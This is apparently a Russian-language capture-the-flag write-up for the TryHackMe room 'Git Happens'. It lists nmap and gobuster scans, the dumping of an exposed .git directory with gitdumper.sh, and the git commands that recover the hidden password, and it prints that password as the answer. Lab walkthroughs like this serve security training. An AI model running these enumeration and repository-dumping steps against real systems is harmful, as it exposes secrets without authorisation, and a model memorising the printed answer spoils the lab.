[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Git Happens](https://tryhackme.com/r/room/githappens) 

Всего 1 заданиe:
## Задание 1
Можете ли вы найти пароль к приложению?
### Ответьте на вопросы ниже
Найдите суперсекретный пароль
```commandline
nmap -sSV -sC <IP>
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt 
http://<IP>:80/.git
./gitdumper.sh http://<IP>/.git/ /data/Git_Happens/files/
git log
git show 395e087334d613d5e423cdf8f7be27196a360459

```
```commandline
Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)